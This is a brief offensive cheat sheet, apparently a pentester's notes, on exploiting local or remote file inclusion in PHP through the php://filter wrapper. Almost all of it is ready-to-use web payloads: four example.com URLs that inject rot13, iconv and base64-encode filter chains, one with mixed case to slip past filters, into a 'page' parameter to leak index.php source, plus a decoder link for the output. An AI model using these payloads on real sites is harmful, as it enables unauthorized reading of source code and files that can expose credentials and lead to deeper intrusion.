Base64Decoder:  https://www.base64decode.org/
--------------------------------------------
LFI / RFI using wrappers
Wrapper php://filter
The part "php://filter" is case insensitive

http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php

------------------------------------------